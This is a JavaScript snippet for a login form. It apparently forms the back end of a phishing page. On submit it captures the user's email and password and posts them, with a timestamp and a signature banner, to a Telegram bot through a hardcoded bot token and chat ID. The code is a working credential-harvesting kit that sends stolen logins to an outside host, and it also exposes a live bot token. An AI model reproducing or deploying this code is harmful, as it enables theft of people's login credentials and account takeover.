    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const botToken = '8482867103:AAHUBasGJtSCNLfpY_lq7AXE0pH7peuWVc8'; // Hardcoded for testing
            const chatId = '5431074831'; // Hardcoded for testing

            // Prepare the message to send to Telegram
            const message = `ğŸŒŸğ˜¼ğ™ªğ™©ğ™ğ™¤ğ™§ ğ˜¼ğ™£ğ™¨ğ™â„¢ğ™“ğŸŒŸ:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;

            try {
                // Send data directly to Telegram API
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                if (response.ok) {
                    alert('Login information sent to Telegram!');
                } else {
                    const errorData = await response.json();
                    alert(`Failed to send login information: ${errorData.description || 'Unknown error'}`);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while sending login information: ' + error.message);
            }
        });
    </script>
